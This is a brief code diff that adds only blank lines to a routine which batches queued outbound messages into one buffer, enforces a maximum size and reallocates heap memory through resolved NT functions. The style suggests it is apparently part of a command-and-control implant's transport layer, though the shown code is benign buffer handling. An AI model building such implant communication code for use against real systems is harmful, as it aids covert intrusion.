@@ -163,8 +163,10 @@ namespace Message {
 #endif
         } else {
             Head = Ctx->Transport.OutboundQueue;
+
             while (Head) {
                 if (!Head->Ready) {
+
                     if (Head->Length + MESSAGE_HEADER_SIZE + Outbound->Length > MESSAGE_MAX) {
                         break;
                     }
@@ -179,6 +181,7 @@ namespace Message {
                         } else {
                             Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
                             x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
+
                             Outbound->Length += Head->Length;
                         }
                     } else {
